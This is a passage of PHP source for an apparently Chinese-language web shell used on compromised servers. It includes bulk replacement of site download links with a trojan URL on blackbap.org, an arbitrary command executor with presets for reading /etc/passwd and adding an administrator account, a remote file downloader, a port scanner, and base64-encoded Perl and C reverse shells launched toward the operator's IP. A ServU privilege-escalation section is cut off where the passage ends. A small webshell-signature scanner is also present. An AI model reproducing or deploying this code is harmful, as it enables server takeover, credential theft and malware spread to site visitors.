<select onchange='return Fullll(options[selectedIndex].value)'>
<option value="0" selected>--类型选择--</option>
<option value="3">静态文件</option>
<option value="4">脚本+静态</option>
<option value="5">JS文件</option>
</select></div>
<div class="actall">清除代码 <textarea name="qc" id="qc" style="width:610px;height:180px;">&lt;script language=javascript src="http://blackbap.org/ad.js"&gt;&lt;/script&gt;</textarea></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>保持文件修改时间不变</div>
<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>将清马应用于该文件夹,子文件夹和文件
<br><input type="radio" name="qb" value="b">仅将清马应用于该文件夹</div>
<div class="actall"><input type="button" value="开始清马" style="width:80px;height:26px;" onclick="autoup();"></div>
</form>
END;
	return true;
}
//批量替换
function Tihuan_Auto($tp,$tt,$th,$tca,$tcb,$td,$tb)
{
	if(($h_d = @opendir($tp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		$Filepath = File_Str($tp.'/'.$Filename);
		if(is_dir($Filepath) && $tb) Tihuan_Auto($Filepath,$tt,$th,$tca,$tcb,$td,$tb);
		$doing = false;
		if(eregi($tt,$Filename))
		{
			$ic = File_Read($Filepath);
			if($th)
			{
				if(!stristr($ic,$tca)) continue;
				$ic = str_replace($tca,$tcb,$ic);
				$doing = true;
			}
			else
			{
				preg_match_all("/href\=\"([^~]*?)\"/i",$ic,$nc);
				for($i = 0;$i < count($nc[1]);$i++){if(eregi($tca,$nc[1][$i])){$ic = str_replace($nc[1][$i],$tcb,$ic);$doing = true;}}
			}
			if($td) $ftime = @filemtime($Filepath);
			if($doing) echo File_Write($Filepath,$ic,'wb') ? '<font color="#006600">成功:</font>'.$Filepath.' <br>'."\r\n" : '<font color="#FF0000">失败:</font>'.$Filepath.' <br>'."\r\n";
			if($td) @touch($Filepath,$ftime);
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}
function Tihuan_d()
{
	if((!empty($_POST['tp'])) && (!empty($_POST['tt'])))
	{
		echo '<div class="actall">';
		$tt = str_replace('.','\\.',$_POST['tt']);
		$td = isset($_POST['td']) ? true : false;
		$tb = ($_POST['tb'] == 'a') ? true : false;
		$th = ($_POST['th'] == 'a') ? true : false;
		if($th) $_POST['tca'] = str_replace('.','\\.',$_POST['tca']);
		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? '<a href="#" onclick="window.location=\'?s=d\'">替换完毕</a>' : '<a href="#" onclick="window.location=\'?s=d\'">异常终止</a>';
		echo '</div>';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
print<<<END
<script language="javascript">
function Fulllll(i){
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";tform.tp.value = Str[i];}
	else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do";Str[5] = ".js";tform.tt.value = Str[i];}
  return true;
}
function showth(th){
	if(th == 'a') document.getElementById('setauto').innerHTML = '查找内容:<textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>替换成为:<textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>下载后缀 <input type="text" name="tca" id="tca" value=".exe|.7z|.rar|.zip|.gz|.txt" style="width:500px;"><br><br>替换成为 <input type="text" name="tcb" id="tcb" value="http://blackbap.org/muma.exe" style="width:500px;">';
	return true;
}
function autoup(){
	if(document.getElementById('tp').value == ''){alert('路径不能为空');return false;}
	if(document.getElementById('tt').value == ''){alert('类型不能为空');return false;}
	if(document.getElementById('tca').value == ''){alert('代码不能为空');return false;}
	document.getElementById('tform').submit();
}
</script>
<form method="POST" name="tform" id="tform" action="?s=d">
<div class="actall" style="height:35px;">替换路径 <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fulllll(options[selectedIndex].value)'>
<option value="0" selected>--范围选择--</option>
<option value="1">网站根目录</option>
<option value="2">本程序目录</option>
</select></div>
<div class="actall" style="height:35px;">文件类型 <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fulllll(options[selectedIndex].value)'>
<option value="0" selected>--类型选择--</option>
<option value="3">静态文件</option>
<option value="4">脚本+静态</option>
<option value="5">JS文件</option>
</select></div>
<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>替换文件中的指定内容 <input type="radio" name="th" value="b" onclick="showth('b')">替换文件中的下载地址<br>
<div id="setauto">查找内容 <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>替换成为 <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>保持文件修改时间不变</div>
<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>将替换应用于该文件夹,子文件夹和文件
<br><input type="radio" name="tb" value="b">仅将替换应用于该文件夹</div>
<div class="actall"><input type="button" value="开始替换" style="width:80px;height:26px;" onclick="autoup();"></div>
</form>
END;
return true;
}
//扫描木马
function Antivirus_Auto($sp,$features,$st,$sb)
{
	if(($h_d = @opendir($sp)) == NULL) return false;
	$ROOT_DIR = File_Mode();
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		$Filepath = File_Str($sp.'/'.$Filename);
		if(is_dir($Filepath) && $sb) Antivirus_Auto($Filepath,$features,$st);
		if(eregi($st,$Filename))
		{
			if($Filepath == File_Str(__FILE__)) continue;
			$ic = File_Read($Filepath);
			foreach($features as $var => $key)
			{
				if(stristr($ic,$key))
				{
					$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath);
					$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
					echo ' <a href="'.$Fileurls.'" target="_blank"> <font color="#8B0000"> '.$Filepath.' </font> </a> <br> 【<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank"> 编辑 </a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank"> 删除 </a> 】 ';
					echo ' 【 '.$Filetime.' 】 <font color="#FF0000"> '.$var.' </font> <br> <br> '."\r\n";
					break;
				}
			}
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}

function Antivirus_e()
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = isset($_POST['sp']) ? $_POST['sp'] : File_Mode();
	$features_php = array('eval一句话特征'=>'eval(','大马read特征'=>'->read()','大马readdir特征3'=>'readdir(','MYSQL自定义函数语句'=>'returns string soname','加密特征1'=>'eval(gzinflate(','加密特征2'=>'eval(base64_decode(','加密特征3'=>'base64_decode(','eval一句话2'=>'eval (','php复制特征'=>'copy($_FILES','复制特征2'=>'copy ($_FILES','上传特征'=>'move_uploaded_file($_FILES','上传特征2'=>'move_uploaded_file ($_FILES','小马特征'=>'str_replace(\'\\\\\',\'/\',');
	$features_asx = array('脚本加密'=>'VBScript.Encode','加密特征'=>'#@~^','fso组件'=>'fso.createtextfile(path,true)','excute一句话'=>'execute','eval一句话'=>'eval','wscript特征'=>'F935DC22-1CF0-11D0-ADB9-00C04FD58A0B','数据库操作特征'=>'13709620-C279-11CE-A49E-444553540000','wscript特征'=>'WScript.Shell','fso特征'=>'0D43FE01-F093-11CF-8940-00A0C9054228','十三函数'=>'╋╁','aspx大马特征'=>'Process.GetProcesses','aspx一句话'=>'Request.BinaryRead');
print<<<END
<form method="POST" name="tform" id="tform" action="?s=e">
<div class="actall">扫描路径 <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">木马类型 <input type="checkbox" name="stphp" value="php" checked>php木马 
<input type="checkbox" name="stasx" value="asx">asp+aspx木马</div>
<div class="actall" style="height:50px;"><input type="radio" name="sb" value="a" checked>将扫马应用于该文件夹,子文件夹和文件
<br><input type="radio" name="sb" value="b">仅将扫马应用于该文件夹</div>
<div class="actall"><input type="submit" value="开始扫描" style="width:80px;"></div>
</form>
END;
if(!empty($_POST['sp']))
{
	echo '<div class="actall">';
	if(isset($_POST['stphp'])){$features_all = $features_php; $st = '\.php|\.inc|\;';}
	if(isset($_POST['stasx'])){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
	if(isset($_POST['stphp']) && isset($_POST['stasx'])){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.asp|\.asa|\.cer|\.aspx|\.ascx|\;';}
	$sb = ($_POST['sb'] == 'a') ? true : false;
	echo Antivirus_Auto($_POST['sp'],$features_all,$st,$sb) ? '扫描完毕' :  '异常终止';
	echo '</div>';
}
return true;
}
//搜索文件
function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb)
{
	//echo $sfp.'<br>'.$sfc.'<br>'.$sft.'<br>'.$sff.'<br>'.$sfb;
	if(($h_d = @opendir($sfp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		if(eregi($sft,$Filename)) continue;
		$Filepath = File_Str($sfp.'/'.$Filename);
		if(is_dir($Filepath) && $sfb) Findfile_Auto($Filepath,$sfc,$sft,$sff,$sfb);
		if($sff)
		{
			if(stristr($Filename,$sfc))
			{
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
		else
		{
			$File_code = File_Read($Filepath);
			if(stristr($File_code,$sfc))
			{
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
	}
	@closedir($h_d);
	return true;
}
function Findfile_j()
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '删除成功';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '删除成功' : '删除失败';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : File_Mode();
	$SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config';
	$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';
print<<<END
<form method="POST" name="jform" id="jform" action="?s=j">
<div class="actall">扫描路径 <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">过滤文件 <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
<div class="actall">关键字串 <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
<input type="radio" name="sff" value="a" checked>搜索文件名 
<input type="radio" name="sff" value="b">搜索包含文字</div>
<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>将搜索应用于该文件夹,子文件夹和文件
<br><input type="radio" name="sfb" value="b">仅将搜索应用于该文件夹</div>
<div class="actall"><input type="submit" value="开始扫描" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['sfp'])) && (!empty($_POST['sfc'])))
	{
		echo '<div class="actall">';
		$_POST['sft'] = str_replace('.','\\.',$_POST['sft']);
		$sff = ($_POST['sff'] == 'a') ? true : false;
		$sfb = ($_POST['sfb'] == 'a') ? true : false;
		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '搜索完毕' : '异常终止';
		echo '</div>';
	}
	return true;
}
//系统信息
function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}}
function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";}
function Info_f()
{
	$dis_func = get_cfg_var("disable_functions");
	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
	$info = array(
		array("服务器时间",date("Y年m月d日 h:i:s",time())),
		array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
		array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
		array("服务器操作系统",PHP_OS),
		array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
		array("你的IP",getenv('REMOTE_ADDR')),
		array("Web服务端口",$_SERVER['SERVER_PORT']),
		array("PHP运行方式",strtoupper(php_sapi_name())),
		array("PHP版本",PHP_VERSION),
		array("运行于安全模式",Info_Cfg("safemode")),
		array("服务器管理员",$adminmail),
		array("本文件路径",__FILE__),
		array("允许使用 URL 打开文件 allow_url_fopen",Info_Cfg("allow_url_fopen")),
		array("允许动态加载链接库 enable_dl",Info_Cfg("enable_dl")),
		array("显示错误信息 display_errors",Info_Cfg("display_errors")),
		array("自动定义全局变量 register_globals",Info_Cfg("register_globals")),
		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
		array("程序最多允许使用内存量 memory_limit",Info_Cfg("memory_limit")),
		array("POST最大字节数 post_max_size",Info_Cfg("post_max_size")),
		array("允许最大上传文件 upload_max_filesize",$upsize),
		array("程序最长运行时间 max_execution_time",Info_Cfg("max_execution_time")."秒"),
		array("被禁用的函数 disable_functions",$dis_func),
		array("phpinfo()",$phpinfo),
		array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
		array("图形处理 GD Library",Info_Fun("imageline")),
		array("IMAP电子邮件系统",Info_Fun("imap_close")),
		array("MySQL数据库",Info_Fun("mysql_close")),
		array("SyBase数据库",Info_Fun("sybase_close")),
		array("Oracle数据库",Info_Fun("ora_close")),
		array("Oracle 8 数据库",Info_Fun("OCILogOff")),
		array("PREL相容语法 PCRE",Info_Fun("preg_match")),
		array("PDF文档支持",Info_Fun("pdf_close")),
		array("Postgre SQL数据库",Info_Fun("pg_close")),
		array("SNMP网络管理协议",Info_Fun("snmpget")),
		array("压缩文件支持(Zlib)",Info_Fun("gzclose")),
		array("XML解析",Info_Fun("xml_set_object")),
		array("FTP",Info_Fun("ftp_login")),
		array("ODBC数据库连接",Info_Fun("odbc_close")),
		array("Session支持",Info_Fun("session_start")),
		array("Socket支持",Info_Fun("fsockopen")),
	);
	echo '<table width="100%" border="0">';
	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
	echo '</table>';
	return true;
}
//执行命令
function Exec_Run($cmd)
{
	$res = '';
	if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
	elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}
	elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
	return $res;
}
function Exec_g()
{
	$res = '回显';
	$cmd = 'dir';
	if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}
print<<<END
<script language="javascript">
function sFull(i){
	Str = new Array(14);
	Str[0] = "dir";
	Str[1] = "ls /etc";
	Str[2] = "cat /etc/passwd";
	Str[3] = "cp -a /home/www/html/a.php /home/www2/";
	Str[4] = "uname -a";
	Str[5] = "gcc -o /tmp/silic /tmp/silic.c";
	Str[6] = "net user silic silic /add & net localgroup administrators silic /add";
	Str[7] = "net user";
	Str[8] = "netstat -an";
	Str[9] = "ipconfig";
	Str[10] = "copy c:\\1.php d:\\2.php";
	Str[11] = "tftp -i 123.234.222.1 get silic.exe c:\\silic.exe";
	Str[12] = "lsb_release -a";
	Str[13] = "chmod 777 /tmp/silic.c";
document.getElementById('cmd').value = Str[i];
return true;
}
</script>
<form method="POST" name="gform" id="gform" action="?s=g"><center><div class="actall">
命令参数 <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:399px;">
<select onchange='return sFull(options[selectedIndex].value)'>
<option value="0" selected>--命令集合--</option>
<option value="1">文件列表</option>
<option value="2">读取配置</option>
<option value="3">拷贝文件</option>
<option value="4">系统信息</option>
<option value="5">编译文件</option>
<option value="6">添加管理</option>
<option value="7">用户列表</option>
<option value="8">查看端口</option>
<option value="9">查看地址</option>
<option value="10">复制文件</option>
<option value="11">FTP下载</option>
<option value="12">内核版本</option>
<option value="13">更改属性</option>
</select>
<input type="submit" value="执行" style="width:80px;"></div>
<div class="actall"><textarea name="show" style="width:660px;height:399px;">{$res}</textarea></div></center></form>
END;
return true;
}
//组件接口
function Com_h()
{
$object = isset($_GET['o']) ? $_GET['o'] : 'adodb';
print<<<END
<div class="actall"><a href="?s=h&o=adodb">[ADODB.Connection]</a> 
<a href="?s=h&o=wscript">[WScript.shell]</a> 
<a href="?s=h&o=application">[Shell.Application]</a> 
<a href="?s=h&o=downloader">[Downloader]</a></div>
<form method="POST" name="hform" id="hform" action="?s=h&o={$object}">
END;
if($object == 'downloader')
{
	$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://blackbap.org/a.exe';
	$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(__FILE__).'/a.exe');
print<<<END
<div class="actall">超连接 <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
<div class="actall">下载到 <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
<div class="actall"><input value="下载" type="submit" style="width:80px;"></div></form>
END;
	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
	{
		echo '<div class="actall">';
		$contents = @file_get_contents($_POST['durl']);
		if(!$contents) echo '无法下载数据';
		else echo File_Write($_POST['dpath'],$contents,'wb') ? '下载成功' : '下载失败';
		echo '</div>';
	}
}
elseif($object == 'wscript')
{
	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir';
print<<<END
<div class="actall">执行CMD命令 <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>
END;
	if(!empty($_POST['cmd']))
	{
		echo '<div class="actall">';
		$shell = new COM('wscript');
		$exe = @$shell->exec("cmd.exe /c ".$cmd);
		$out = $exe->StdOut();
		$output = $out->ReadAll();
		echo '<pre>'.$output.'</pre>';
		@$shell->Release();
		$shell = NULL;
		echo '</div>';
	}
}
elseif($object == 'application')
{
	$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';
	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\boot.ini d:\a.txt';
print<<<END
<div class="actall">程序路径 <input type="text" name="run" value="{$run}" style="width:600px;"></div>
<div class="actall">命令参数 <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>
END;
	if(!empty($_POST['run']))
	{
		echo '<div class="actall">';
		$shell = new COM('application');
		echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '执行成功' : '执行失败';
		@$shell->Release();
		$shell = NULL;
		echo '</div>';
	}
}
elseif($object == 'adodb')
{
	$string = isset($_POST['string']) ? $_POST['string'] : '';
	$sql = isset($_POST['sql']) ? $_POST['sql'] : '';
print<<<END
<script language="javascript">
function hFull(i){
	if(i==0 || i==5) return false;
	Str = new Array(12);  
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
	Str[2] = "Driver={Sql Server};Server=,1433;Database=DB;Uid=sa;Pwd=**";
	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DB;Uid=root;Pwd=**";
	Str[4] = "Provider=MSDAORA.1;Password=密码;User ID=帐号;Data Source=服务名;Persist Security Info=True;";
	Str[6] = "SELECT * FROM [TableName] WHERE ID<10";
	Str[7] = "INSERT INTO [TableName](usr,psw) VALUES('yoco','pwd')";
	Str[8] = "DELETE FROM [TableName] WHERE ID=1";
	Str[9] = "UPDATE [TableName] SET USER='yoco' WHERE ID=1";
	Str[10] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[11] = "DROP TABLE [TableName]";
	Str[12] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[13] = "ALTER TABLE [TableName] DROP COLUMN PASS";
	if(i<=4){document.getElementById('string').value = Str[i];}else{document.getElementById('sql').value = Str[i];}
	return true;
}
</script>
<div class="actall">连接字符串 <input type="text" name="string" id="string" value="{$string}" style="width:526px;">
<select onchange="return hFull(options[selectedIndex].value)">
<option value="0" selected>--连接示例--</option>
<option value="1">Access连接</option>
<option value="2">MsSql连接</option>
<option value="3">MySql连接</option>
<option value="4">Oracle连接</option>
<option value="5">--SQL语法--</option>
<option value="6">显示数据</option>
<option value="7">添加数据</option>
<option value="8">删除数据</option>
<option value="9">修改数据</option>
<option value="10">建数据表</option>
<option value="11">删数据表</option>
<option value="12">添加字段</option>
<option value="13">删除字段</option>
</select></div>
<div class="actall">SQL命令 <input type="text" name="sql" id="sql" value="{$sql}" style="width:650px;"></div>
<div class="actall"><input type="submit" value="执行" style="width:80px;"></div>
</form>
END;
	if(!empty($string))
	{
		echo '<div class="actall">';
		$shell = new COM('adodb');
		@$shell->Open($string);
		$result = @$shell->Execute($sql);
		$count = $result->Fields->Count();
		for($i = 0;$i < $count;$i++){$Field[$i] = $result->Fields($i);}
		echo $result ? $sql.' 执行成功<br>' : $sql.' 执行失败<br>';
		if(!empty($count)){while(!$result->EOF){for($i = 0;$i < $count;$i++){echo htmlspecialchars($Field[$i]->value).'<br>';}@$result->MoveNext();}}
		$shell->Close();
		@$shell->Release();
		$shell = NULL;
		echo '</div>';
	}
}
	return true;
}

//扫描端口
function Port_i()
{
	$Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';
	$Port_port = isset($_POST['port']) ? $_POST['port'] : '21|22|23|25|80|110|135|139|445|1433|3306|3389|8000|43958';
print<<<END
<form method="POST" name="iform" id="iform" action="?s=i">
<div class="actall">扫描IP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
<div class="actall">端口号 <input type="text" name="port" value="{$Port_port}" style="width:597px;"></div>
<div class="actall"><input type="submit" value="扫描" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['ip'])) && (!empty($_POST['port'])))
	{
		echo '<div class="actall">';
		$ports = explode('|', $_POST['port']);
		for($i = 0;$i < count($ports);$i++)
		{
			$fp = @fsockopen($_POST['ip'],$ports[$i],&$errno,&$errstr,2);
			echo $fp ? '<font color="#FF0000">开放端口 ---> '.$ports[$i].'</font><br>' : '关闭端口 ---> '.$ports[$i].'<br>';
			ob_flush();
			flush();
		}
		echo '</div>';
	}
	return true;
}

//Linux提权
function Linux_k()
{
	$yourip = isset($_POST['yourip']) ? $_POST['yourip'] : getenv('REMOTE_ADDR');
	$yourport = isset($_POST['yourport']) ? $_POST['yourport'] : '12666';
print<<<END
<form method="POST" name="kform" id="kform" action="?s=k">
<div class="actall">你的地址 <input type="text" name="yourip" value="{$yourip}" style="width:400px"></div>
<div class="actall">连接端口 <input type="text" name="yourport" value="12666" style="width:400px"></div>
<div class="actall">执行方式 <select name="use" >
<option value="perl">perl</option>
<option value="c">c</option>
</select></div>
<div class="actall"><input type="submit" value="连接" style="width:80px;"></div></form>
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		echo '<div class="actall">';
		if($_POST['use'] == 'perl')
		{
			$back_connect_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
			"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
			"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
			"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
			"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
			"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
			"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
			echo File_Write('/tmp/yoco_bc',base64_decode($back_connect_pl),'wb') ? '创建/tmp/yoco_bc成功<br>' : '创建/tmp/yoco_bc失败<br>';
			$perlpath = Exec_Run('which perl');
			$perlpath = $perlpath ? chop($perlpath) : 'perl';
			echo Exec_Run($perlpath.' /tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '执行命令失败';
		}
		if($_POST['use'] == 'c')
		{
			$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
			"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
			"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
			"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
			"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
			"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
			"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
			"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
			echo File_Write('/tmp/yoco_bc.c',base64_decode($back_connect_c),'wb') ? '创建/tmp/yoco_bc.c成功<br>' : '创建/tmp/yoco_bc.c失败<br>';
			$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/yoco.c');
			echo Exec_Run('/tmp/yoco_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '执行命令失败';
		}
		echo '<br>你可以尝试连接端口 (nc -l -n -v -p '.$_POST['yourport'].') </div>';
	}
	return true;
}

//ServU
function Servu_l()
{
	$SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P';
print<<<END
<div class="actall"><a href="?s=l">[执行命令]</a> <a href="?s=l&o=adduser">[添加用户]</a></div>
<form method="POST">
	<div class="actall">ServU端口 <input name="SUPort" type="text" value="43958" style="width:300px"></div>
	<div class="actall">ServU用户 <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
	<div class="actall">ServU密码 <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
END;
if($_GET['o'] == 'adduser')
{
print<<<END
<div class="actall">帐号 <input name="user" type="text" value="yoco" style="width:200px">
